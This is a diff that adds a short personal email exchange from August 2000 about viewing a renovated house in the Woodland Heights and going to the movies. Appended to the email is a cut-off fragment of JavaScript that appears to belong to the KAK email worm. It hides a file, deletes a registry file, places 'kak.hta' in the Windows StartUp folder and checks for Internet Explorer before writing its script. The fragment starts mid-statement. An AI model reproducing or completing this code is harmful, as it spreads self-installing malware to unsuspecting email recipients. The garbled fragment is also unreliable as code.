@@ -1,0 +1,31 @@
+
+ 
+ Sure.  Maybe after running we could get cleaned up and go take a look.  Do 
+ you still want to go to the movies?
+ 
+ 
+ 
+
+ 	08/04/2000 03:18 PM
+ 		 
+
+ 		  		  
+ 
+ 
+ Good Day,
+ ?
+ I want you to go with me to look at this house I  have been checking out in 
+ the Woodland Heights.? It is a re-do, gutted and  cleaned up, and ready to be 
+ moved in to asap.? Are you working late  tonight, and, if not, would you be 
+ up for me coming by just for a quick  trip???? You may have plans, and, if 
+ you do, could I grab you tomorrow for  a quick look?? I am putting a 'for 
+ sale by owner' sign in my yard  today!!!
+ ?
+ Let me know
+ ?
+ ');t3.close();fs.GetFile(wd+'kak.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg'
+ );d=new Date();if(d.getDate()"fr")?"C:\\windows\\Menu 
+ D?marrer\\Programmes\\D?marrage\\kak.hta":"C:\\windows\\Start 
+ Menu\\Programs\\StartUp\\kak.hta";agt=navigator.userAgent.toLowerCase();if(((a
+ gt.indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("ms
+ ie 5.")!=-1))scr.write(); //-->
